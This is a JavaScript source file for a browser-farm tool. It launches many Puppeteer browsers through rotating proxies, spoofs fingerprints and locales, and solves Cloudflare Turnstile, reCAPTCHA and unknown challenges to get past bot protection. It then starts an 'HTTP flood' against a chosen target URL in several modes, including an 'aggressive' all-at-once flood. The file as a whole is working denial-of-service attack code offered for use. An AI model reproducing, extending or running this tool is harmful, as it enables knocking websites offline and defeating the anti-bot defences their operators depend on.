import * as puppeteer from "puppeteer-real-browser";

import { Flooder } from "./Flooder.js";
import {
  formatLocales,
  getAbuseStatus,
  getTimeZoneByIp,
  randnum,
  readFile,
  getChromePath,
  proxyTest,
} from "../util/Helpers.js";
import { BrowserObject } from "../obj/BrowserObject.js";
import { solveCloudflare } from "./Cloudflare.js";
import { solveRecaptcha } from "./Recaptcha.js";

import { log, detectChallenges } from "../util/Util.js";
import { autoBypass } from "./Autobypass/Unknown.js";

const BROWSER_CONFIG = {
  targetUrl:
    process.argv.find((arg) => arg.startsWith("-t="))?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("--target="))?.split("=")[1] ||
    "https://example.com",
  headless:
    process.argv.find((arg) => arg.startsWith("-hl="))?.split("=")[1] ===
      "true" ||
    process.argv.find((arg) => arg.startsWith("--headless="))?.split("=")[1] ===
      "true" ||
    false,
  filterProxies:
    process.argv.find((arg) => arg.startsWith("-fp="))?.split("=")[1] ===
      "true" ||
    process.argv
      .find((arg) => arg.startsWith("--filter-proxies="))
      ?.split("=")[1] === "true" ||
    false,
  browserMode:
    process.argv
      .find((arg) => arg.startsWith("--browser-mode="))
      ?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-bmode="))?.split("=")[1],
  targetPort:
    parseInt(
      process.argv.find((arg) => arg.startsWith("-port="))?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("--targetPort="))?.split("=")[1]
    ) ||
    null,
  browserCount:
    /**
     * * Max amount of browsers with different proxies
     */
    parseInt(
      process.argv.find((arg) => arg.startsWith("-b="))?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("--browsers="))?.split("=")[1]
    ) ||
    5,
  floodersPerProxy:
    /**
     * * Used in Captcha.js to set max concurrent workers for the Flooder running per browser
     */
    parseInt(
      process.argv
        .find((arg) => arg.startsWith("--flooders-per-proxy="))
        ?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("-fpp="))?.split("=")[1]
    ) ||
    1,
  rps:
    /*
     * ! Used in Flooder.js to set max concurrent proxy connections per thread
     */
    parseInt(
      process.argv.find((arg) => arg.startsWith("--requests="))?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("-rps="))?.split("=")[1]
    ) ||
    10,
  runtime:
    parseInt(
      process.argv.find((arg) => arg.startsWith("--time="))?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("-runtime="))?.split("=")[1]
    ) ||
    120,
  proxyTimeout:
    parseInt(
      process.argv
        .find((arg) => arg.startsWith("--proxy-timeout="))
        ?.split("=")[1]
    ) ||
    parseInt(
      process.argv.find((arg) => arg.startsWith("-pt="))?.split("=")[1]
    ) ||
    8000,
  waitTime:
    process.argv.find((arg) => arg.startsWith("--waitTime="))?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-wt="))?.split("=")[1] ||
    "0:0",
  customCookie:
    process.argv
      .find((arg) => arg.startsWith("--cookie-value="))
      ?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-cookie="))?.split("=")[1],
  userAgents:
    process.argv.find((arg) => arg.startsWith("--uas-file="))?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-uas="))?.split("=")[1] ||
    "../files/uas.txt",
  cookiesFile:
    process.argv
      .find((arg) => arg.startsWith("--all-cookies-json="))
      ?.split("=")[1] ||
    process.argv
      .find((arg) => arg.startsWith("-cookies-file="))
      ?.split("=")[1] ||
    "../files/all_cookies.json",
  localeFile:
    process.argv
      .find((arg) => arg.startsWith("--locale-file="))
      ?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-locales="))?.split("=")[1] ||
    "../files/locales.txt",
  clearanceFile:
    process.argv
      .find((arg) => arg.startsWith("--cf-clearance-file="))
      ?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-cfc-file="))?.split("=")[1] ||
    "../files/cf_clearance.txt",
  proxyFile:
    process.argv
      .find((arg) => arg.startsWith("--proxy-file="))
      ?.split("=")[1] ||
    process.argv.find((arg) => arg.startsWith("-p="))?.split("=")[1] ||
    "../files/proxies.txt",
};

const args = process.argv.slice(2);

for (let i = 0; i < args.length; i++) {
  switch (args[i]) {
    case "--target":
    case "-t":
      BROWSER_CONFIG.targetUrl = args[i + 1];
      i++;
      break;
    case "--targetPort":
    case "-port":
      BROWSER_CONFIG.targetPort = args[i + 1];
      i++;
      break;
    case "--headless":
    case "-hl":
      BROWSER_CONFIG.headless = args[i + 1] === "true";
      i++;
      break;
    case "--browser-mode":
    case "-bmode":
      BROWSER_CONFIG.browserMode = args[i + 1];
      i++;
      break;
    case "--filter-proxies":
    case "-fp":
      BROWSER_CONFIG.filterProxies = args[i + 1] === "true";
      i++;
      break;
    case "--browsers":
    case "-b":
      BROWSER_CONFIG.browserCount = parseInt(args[i + 1]);
      i++;
      break;
    case "--flooders-per-proxy":
    case "-fpp":
      BROWSER_CONFIG.floodersPerProxy = parseInt(args[i + 1]);
      i++;
      break;
    case "--requests":
    case "-rps":
      BROWSER_CONFIG.rps = parseInt(args[i + 1]);
      i++;
      break;
    case "--time":
    case "-runtime":
      BROWSER_CONFIG.runtime = parseInt(args[i + 1]);
      i++;
      break;
    case "--proxy-timeout":
    case "-pt":
      BROWSER_CONFIG.proxyTimeout = parseInt(args[i + 1]);
      i++;
      break;
    case "--waitTime":
    case "-wt":
      BROWSER_CONFIG.waitTime = args[i + 1];
      i++;
      break;
    case "--cookie-value":
    case "-cookie":
      BROWSER_CONFIG.customCookie = args[i + 1];
      i++;
      break;
    case "--cf-clearance-file":
    case "-cfc-file":
      BROWSER_CONFIG.clearanceFile = args[i + 1];
      i++;
      break;
    case "--proxy-file":
    case "-p":
      BROWSER_CONFIG.proxyFile = args[i + 1];
      i++;
      break;
    case "--uas-file":
    case "-uas":
      BROWSER_CONFIG.userAgents = args[i + 1];
      i++;
      break;
    case "--all-cookies-json":
    case "-cookies-file":
      BROWSER_CONFIG.cookiesFile = args[i + 1];
      i++;
      break;
    case "--locale-file":
    case "-locales":
      BROWSER_CONFIG.localeFile = args[i + 1];
      i++;
      break;
    case "--help":
    case "-h":
      console.log(`
🌐 Cloudflare Browser Automation Tool

Usage: node browser.js [options]

Required Options:
  -t, --target <url>        Target URL for browser automation

Optional Options:
  -b, --browsers <num>     Number of browsers (default: 5)
  -hl, --headless <true|false>  Run browsers in headless mode (default: false)
  -bmode, --browser-mode <normal|stealth|aggressive|continuous> Determine, which type of flood the Flooder instance will use
        mode normal: Standard page evaluation with no delays, anti detection or stealth
        mode stealth: WARNING: Consider that setting -fpp to 1 (=> 1 request per proxy) is recommended, to avoid multiple workers. Human movement, delays and stealth
        mode aggressive: CPU intensive, high request flood / A.K.A Just send all requests at once
        mode continuous: Runtime based flood, page evaluation
  -fp, --filter-proxies <true|false>  Filter non working proxies (default: false)
  -port, --targetPort <port>  Target port if not standard, only relevant for Flooder (default: 80/443)
  -pt, --proxy-timeout <ms>  Proxy connection timeout in milliseconds (default: 8000) Notice: Only set this, if --filter-proxies or -fp is set to true!
  -fpp, --flooders-per-proxy <num> Amount of Flooders started per Browser [fpp * rps == totalRequestsPerProxy] (default: 1)
  -rps, --requests <num>  Requests each proxy tries within one Flooder thread (default: 10)
  -wt, --waitTime <min:max> Time to wait between flooding and solving process
  -time, --runtime <seconds>  Total runtime in seconds (default: 120)
  -cookie, --cookie-value <cookiename:cookievalue>  Set a custom cookie, incase needed [Only applies for non-reCaptcha /- non-CloudFlare targets, as those have fixed cookie-/value pairs e.g. cf_clearance] (default: "cookie:cookie_value")
  -uas, --uas-file <file>  User agent strings file (default: ../files/uas.txt)
  -cookies-file, --all-cookies-json <file>  All cookies JSON file (default: ../files/all_cookies.json)
  -locales, --locale-file <file>  Locale file (default: ../files/locales.txt)
  -p, --proxy-file <file>  Custom proxy file (default: proxies.txt)
  -h, --help               Show this help message

Examples:
  node browser.js -t https://example.com
  node browser.js --target https://example.com --browsers 10 -cookie customCookie:customValueSomeData12324532BlaBla
  node browser.js -t https://example.com -b 10 -dl 120
  node browser.js -t https://example.com -p custom_proxies.txt

Note: This tool automates browsers.
            `);
      process.exit(0);
      break;
  }
}

if (
  !BROWSER_CONFIG.targetUrl ||
  BROWSER_CONFIG.targetUrl === "https://example.com"
) {
  console.error("❌ Error: Target URL is required!");
  console.error("Usage: node browser.js -t <target_url>");
  console.error("Use --help for more information");
  process.exit(1);
}

// Random window sizes for better fingerprinting
const WINDOW_SIZES = [
  { width: 1920, height: 1080 },
  { width: 1366, height: 768 },
  { width: 1440, height: 900 },
  { width: 1536, height: 864 },
  { width: 1280, height: 720 },
  { width: 1600, height: 900 },
  { width: 1680, height: 1050 },
  { width: 2560, height: 1440 },
  { width: 3840, height: 2160 }, // 4K
  { width: 3440, height: 1440 }, // Ultrawide
  { width: 1920, height: 1200 }, // 16:10
  { width: 1680, height: 1050 }, // 16:10
  { width: 1440, height: 900 }, // 16:10
  { width: 1280, height: 800 }, // 16:10
];

function getRandomWindowSize() {
  return WINDOW_SIZES[Math.floor(Math.random() * WINDOW_SIZES.length)];
}

function getRandomUserAgent(uaArr) {
  return uaArr[Math.floor(Math.random() * uaArr.length)];
}

function getProxy(proxyArray) {
  try {
    const proxies = proxyArray
      .map((line) => {
        if (line.includes(":")) {
          const size = line.split(":").length;
          /**
           * Can either be host:port which would equal size 2
           * or
           * host:port:username:password which would equal size 4
           */
          if (size == 2) {
            const [host, port] = line.split(":");
            return { host: host.trim(), port: parseInt(port.trim()) };
          } else if (size == 4) {
            const [host, port, username, password] = line.split(":");
            return {
              host: host.trim(),
              port: parseInt(port.trim()),
              username: username.trim(),
              password: password.trim(),
            };
          } else {
            log("ERROR", `Invalid proxy format: ${line}`);
            return null;
          }
        }
        return null;
      })
      .filter((proxy) => proxy !== null);

    if (proxies.length > 0) {
      log(
        "INFO",
        `Loaded ${proxies.length} proxies from '${BROWSER_CONFIG.proxyFile}'`
      );
    } else {
      log("WARN", `No valid proxies found in '${BROWSER_CONFIG.proxyFile}'`);
    }

    return proxies;
  } catch (error) {
    log(
      "WARN",
      `Proxy file '${BROWSER_CONFIG.proxyFile}' not found or invalid`
    );
    return [];
  }
}

async function setupBrowser(targetUrl, browserId, browsers, proxies) {
  const proxyIndex = browserId - 1;

  let connect;
  try {
    connect = puppeteer.connect;
  } catch (error) {
    log(
      "ERROR",
      `Browser ${browserId}: Failed to import puppeteer-real-browser: ${error.message}`
    );
    return false;
  }

  /**
   * ! Grab all necessary arrays or values
   */
  /**
   * Read file content into array
   */
  const userAgentArr = readFile(BROWSER_CONFIG.userAgents);
  /**
   * localesArr is an array of locales AND timezones, Format locale:timezone
   */
  const localesArr = readFile(BROWSER_CONFIG.localeFile);
  /**
   * Turn locales in array of objects {lang, timezone}
   */
  const locales = formatLocales(localesArr);

  if (proxies.length <= 0) {
    log("ERROR", `Browser ${browserId}: No valid proxies available.`);
  } else {
    log("PROXY", `Browser ${browserId}: Amount of proxies: ${proxies.length}`);
  }

  const windowSize = getRandomWindowSize();
  const userAgent = getRandomUserAgent(userAgentArr);
  /**
   * ? Create hashmaps to obtain correct country codes
   */
  /* locale -> timezone */
  const localeToTimezone = new Map(
    locales.map((obj) => [obj.lang, obj.timezone])
  );
  const timezoneToLocale = new Map(
    locales.map((obj) => [obj.timezone, obj.lang])
  );
  const timezoneFromIp =
    (await getTimeZoneByIp(proxies[proxyIndex].host)) || "America/New_York";
  /**
   * Grab locals from hashMap and API
   */
  /**
   * ? Incase, the getTimeZoneByIp is unable, to obtain the proxies locales, use default on both
   */
  const locale = timezoneToLocale.get(timezoneFromIp) || "en-US";
  const timezone = localeToTimezone.get(locale) || timezoneFromIp;

  const abuseStats = await getAbuseStatus(proxies[proxyIndex].host);

  if (abuseStats.suspectedAbuse || abuseStats.highScore) {
    log(
      "PROXY",
      `Browser ${browserId}: Proxy ${proxies[proxyIndex].host} is listed as abusive. Abuse Score: ${abuseStats.abuseScore}`
    );
  }
  if (abuseStats.suspectedAbuse && abuseStats.highScore) {
    log(
      "PROXY",
      `Browser ${browserId}: Proxy ${proxies[proxyIndex].host} has a very high abuse score and will not work properly. Abuse Score: ${abuseStats.abuseScore}`
    );
  }

  if (abuseStats.possibleAbuse) {
    log(
      "PROXY",
      `Browser ${browserId}: Proxy ${proxies[proxyIndex].host} has an abuse rate of ${abuseStats.abuseScore}, this might cause issues.`
    );
  }

  /**
   * ! Set the selected information in the Browser Object to store it for later:
   */
  let browserData = null;
  if (proxyIndex >= 0 && proxyIndex < proxies.length) {
    browserData = new BrowserObject(
      browserId,
      targetUrl,
      userAgent,
      locale,
      proxies[proxyIndex].host,
      proxies[proxyIndex].port,
      BROWSER_CONFIG
    );
  }

  log("FARM", `Browser ${browserId}: Starting with random config`);
  log(
    "INFO",
    `Browser ${browserId}: Window: ${windowSize.width}x${windowSize.height}, Locale: ${locale}, Timezone: ${timezone}, Proxy: ${proxies[proxyIndex].host}:${proxies[proxyIndex].port}`
  );
  const connectOptions = {
    headless: BROWSER_CONFIG.headless == true ? "new" : false,
    turnstile: true,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-blink-features=AutomationControlled",
      `--window-size=${windowSize.width},${windowSize.height}`,
      `--lang=${locale}`,
      `--timezone=${timezone}`,
    ],
    connectOption: {
      /**
       * ! IMPORTANT:
       */
      defaultViewport: null,
    },
    fingerprint: {
      devices: ["desktop"],
      locales: [locale],
      screens: [`${windowSize.width}x${windowSize.height}`],
    },
    customConfig: {
      userAgent: userAgent,
      executablePath: getChromePath(),
    },
    proxy: {
      host: proxies[proxyIndex].host || null,
      port: proxies[proxyIndex].port || null,
      username: proxies[proxyIndex].username || null,
      password: proxies[proxyIndex].password || null,
    },
  };

  let browser, page;
  try {
    const result = await connect(connectOptions);
    browser = result.browser;
    page = result.page;

    page = await browser.newPage();

    browsers[browserId - 1] = browser;
  } catch (error) {
    log("ERROR", `Browser ${browserId}: Failed to connect: ${error.message}`);
    return false;
  }

  try {
    log("SUCCESS", `Browser ${browserId}: Starting Puppeteer`);
    log("INFO", `Browser ${browserId}: Target > ${targetUrl}`);

    await page.goto(targetUrl, {
      waitUntil: "domcontentloaded",
      timeout: 60000,
    });

    log("INFO", `Browser ${browserId}: Checking for Turnstile/Challenge`);

    const { hasTurnstile, hasRecaptcha, unknownCaptcha } =
      await detectChallenges(page);

    browserData.setPage(page);

    if (hasRecaptcha) {
      return await solveRecaptcha(
        page,
        browserId,
        browserData,
        proxies[proxyIndex]
      );
    } else if (hasTurnstile) {
      return await solveCloudflare(
        page,
        browserId,
        browserData,
        proxies[proxyIndex]
      );
    } else if (unknownCaptcha) {
      log("WARN", `Browser ${browserId}: Unknown captcha detected`);
      return await autoBypass(
        page,
        browserId,
        proxies[proxyIndex],
        browserData
      );
    } else {
      log("SUCCESS", `Browser ${browserId}: No challenge detected.`);
      return { success: true, browserData };
    }
  } catch (error) {
    log(
      "ERROR",
      `Browser ${browserId}: Unable to create proxy tunnel: ${error}`
    );
    if (browser) {
      try {
        await browser.close();
      } catch {}
    }
    return { success: false, browserData: null };
  }
}

async function setupProxy() {
  /**
   * Proxies
   */
  const proxiesArr = readFile(BROWSER_CONFIG.proxyFile);

  let proxies = [];
  if (BROWSER_CONFIG.filterProxies) {
    proxies = await proxyTest(
      getProxy(proxiesArr),
      BROWSER_CONFIG.proxyTimeout,
      BROWSER_CONFIG.filterAbusiveProxies,
      BROWSER_CONFIG.sortProxies
    );
  } else {
    proxies =
      getProxy(
        proxiesArr
      ); /** Returns Array of proxy objects Format: arr : obj: host: 0.0.0.0, port: 80 */
  }
  return proxies;
}

async function startBrowsers(targetUrl, browserCount = 10) {
  log("FARM", `Starting ${browserCount} browsers...`);

  const proxies = await setupProxy();

  const browserPromises = [];
  const browsers = [];

  for (let i = 1; i <= browserCount; i++) {
    log("FARM", `Starting browser ${i}/${browserCount}`);
    /**
     * !!! No await here, to keep concurrency of the browsers!
     */
    const browserPromise = setupBrowser(targetUrl, i, browsers, proxies);
    browserPromises.push(browserPromise);
    if (i < browserCount) {
      await new Promise((r) => setTimeout(r, 500));
    }
  }

  log("INFO", "All browsers started. Waiting for completion...");
  const settled = await Promise.allSettled(browserPromises);
  const results = settled
    .map((p, i) =>
      p.status === "fulfilled"
        ? p.value
        : { success: false, browserId: i + 1, error: p.reason }
    )
    .filter(Boolean);

  log("INFO", `Amount of browser instances: ${results.length}`);
  const successfulBrowsers = results.filter(
    (r) => r && r.success && r.browserData
  );

  log(
    "SUCCESS",
    `Browsers completed, engaging flooders! ${successfulBrowsers.length}/${browserCount} browsers successful`
  );

  if (successfulBrowsers.length > 0) {
    log(
      "FARM",
      "All browsers are now in waiting state. Starting HTTP flood..."
    );
    let waitTime = BROWSER_CONFIG.waitTime.split(":")[1];
    if (waitTime > 0) {
      waitTime = randnum(
        parseInt(BROWSER_CONFIG.waitTime.split(":")[0]),
        parseInt(BROWSER_CONFIG.waitTime.split(":")[1])
      );
      for (let i = waitTime; i > 0; i--) {
        log("INFO", `Waiting: ${i}s`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    } else {
      log("INFO", "No waitTime specified. Proceeding with HTTP Flooder...");
    }
    /**
     * ? Start flooding here using the Flooder.js implementation
     */

    log("INFO", "Starting HTTP flood.");

    /*console.dir(results, { depth: null });
     */
    const flooderPromises = [];
    switch (BROWSER_CONFIG.browserMode) {
      case "stealth":
        {
          for (const { browserData } of successfulBrowsers) {
            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
              const httpRequest = new Flooder(browserData);
              const instance = httpRequest.startStealth(browserData.page);
              flooderPromises.push(instance);
            }
          }
        }
        break;
      case "aggressive":
        {
          for (const { browserData } of successfulBrowsers) {
            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
              const httpRequest = new Flooder(browserData);
              const instance = httpRequest.startAggressive(browserData.page);
              flooderPromises.push(instance);
            }
          }
        }
        break;
      case "normal":
        {
          for (const { browserData } of successfulBrowsers) {
            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
              const httpRequest = new Flooder(browserData);
              const instance = httpRequest.start(browserData.page, i);
              flooderPromises.push(instance);
            }
          }
        }
        break;
      case "continuous":
        {
          for (const { browserData } of successfulBrowsers) {
            for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
              const httpRequest = new Flooder(browserData);
              const instance = httpRequest.startContinuous(
                browserData.page,
                (BROWSER_CONFIG.runtime * 1000) / 2 + 30
              );
              flooderPromises.push(instance);
            }
          }
        }
        break;
      default: {
        for (const { browserData } of successfulBrowsers) {
          for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
            const httpRequest = new Flooder(browserData);
            const instance = httpRequest.start(browserData.page, i);
            flooderPromises.push(instance);
          }
        }
      }
    }

    const settledFlooders = await Promise.allSettled(flooderPromises);

    const flooderResults = settledFlooders
      .map((p) => (p.status === "fulfilled" ? p.value : null))
      .filter(Boolean);

    const totalSuccess = flooderResults.reduce(
      (sum, r) => sum + (r.stats?.success || 0),
      0
    );
    const totalRequests = flooderResults.reduce(
      (sum, r) => sum + (r.stats?.total || 0),
      0
    );

    log(
      "SUCCESS",
      `All flooders completed: ${totalSuccess}/${totalRequests} total successful requests`
    );
  } else {
    log("ERROR", "No browsers successful, cannot start flooding");
    for (let i = 0; i < browsers.length; i++) {
      if (browsers[i]) {
        try {
          await browsers[i].close();
        } catch (error) {}
      }
    }
  }
}

async function main() {
  log("INFO", "Starting browser automation...");

  const TIME_LIMIT = BROWSER_CONFIG.runtime * 1000;

  await Promise.race([
    startBrowsers(BROWSER_CONFIG.targetUrl, BROWSER_CONFIG.browserCount),
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("⏰ Time limit reached")), TIME_LIMIT)
    ),
  ]);
}

main().catch((error) => {
  log("ERROR", error.message);
  if (error.message.includes("Time limit")) {
    log("WARN", "Shutting down all browsers due to timeout...");
    process.exit(0);
  }
  if (error.message.includes("Failed to launch the browser")) {
    log("INFO", "Possible solutions:");
    log("INFO", "1. Run with sudo (Linux/Mac)");
    log("INFO", "2. Install Chrome/Chromium");
    log("INFO", "3. Try with --no-sandbox flag");
  }
});
